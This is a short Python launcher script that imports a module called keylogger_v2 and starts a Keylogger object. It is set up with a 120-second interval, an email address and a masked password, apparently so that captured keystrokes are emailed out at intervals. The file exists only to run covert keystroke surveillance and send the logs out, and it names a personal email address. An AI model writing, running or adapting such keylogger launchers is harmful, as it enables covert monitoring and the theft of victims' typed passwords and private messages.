#!/usr/bin/env python

# from this program we call an instance of our class and run it

import keylogger_v2

# enter a time interval and email and password to initite this object
my_keylogger = keylogger_v2.Keylogger(120, "dickkurz77@gmail.com", "********")
my_keylogger.start()
